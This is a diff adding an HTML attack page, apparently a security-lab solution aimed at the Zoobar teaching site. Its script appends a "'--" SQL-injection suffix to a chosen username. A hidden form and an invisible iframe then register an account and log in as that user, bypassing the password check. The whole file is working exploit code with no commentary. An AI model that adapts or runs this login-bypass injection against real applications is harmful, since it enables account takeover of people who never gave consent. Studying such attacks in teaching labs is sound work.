@@ -1,0 +1,50 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3. org/TR/html4/loose.dtd">
+<html>
+  <head>
+    <script>
+      function handleUsernameChanged() {
+        document.getElementById("uname2").value =
+          document.getElementById("uname1").value + "'--";
+      }
+      var status = 0;
+      function iframeload() {
+        if (status == 0) {
+          document.getElementById("form").style.display = "block";
+          status++;
+        } else if (status == 1) {
+          document.getElementById("form").style.display = "none";
+          document.getElementById("form").target = "_self";
+          document.getElementById("login").click();
+        }
+      }
+    </script>
+  </head>
+  <body>
+    <div>
+      <form
+        action="http://zoobar.org/index.php"
+        method="POST"
+        target="if"
+        id="form"
+        style="display: none;"
+      >
+        <input id="uname1" type="text" onchange="handleUsernameChanged()" />
+        <input id="uname2" type="hidden" name="login_username" />
+        <input name="login_password" type="hidden" value="password" />
+        <input
+          type="submit"
+          name="submit_login"
+          id="login"
+          style="display:none"
+        />
+        <input type="submit" name="submit_registration" />
+      </form>
+    </div>
+    <iframe
+      name="if"
+      id="if"
+      onload="iframeload()"
+      style="display: none;"
+    ></iframe>
+  </body>
+</html>
